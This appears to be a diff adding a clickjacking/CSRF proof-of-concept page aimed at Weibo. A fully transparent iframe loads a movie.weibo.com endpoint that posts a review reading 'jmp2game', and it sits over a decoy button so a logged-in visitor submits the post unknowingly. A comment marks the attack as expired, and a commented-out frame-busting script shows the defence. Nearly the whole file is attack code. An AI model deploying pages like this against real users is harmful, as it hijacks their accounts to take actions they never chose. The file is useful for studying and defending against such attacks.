@@ -1,0 +1,45 @@
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<head>jmp2game</head>
+<!-- 微博CSRF[失效] -->
+<!--
+iframe防御
+<head>
+<style> body { display : none;} </style>
+</head>
+<body>
+<script>
+if (self == top) {
+    var theBody = document.getElementsByTagName('body')[0];
+    theBody.style.display = "block";
+} else {
+    top.location = self.location;
+}
+</script>
+-->
+<html>
+<style type="text/css">
+  iframe {
+    width:800px;
+    height:700px;
+    top:335px;
+    left:300px;
+    z-index:5;
+    position:absolute;
+    -moz-opacity:0;
+    opacity:0;
+    filter:alpha(opacity=0);
+  }
+  button { 
+    position: absolute;
+    top: 250px;
+    left: 770px;
+    z-index: 1;
+    width: 80px;
+    height:20px;
+  }
+</style>
+<body>
+
+  <iframe src="http://movie.weibo.com/page/weiboplugin/sendweibo?type=1&needscore=1&title=写短评&content=jmp2game"></iframe>
+</body>
+</html>
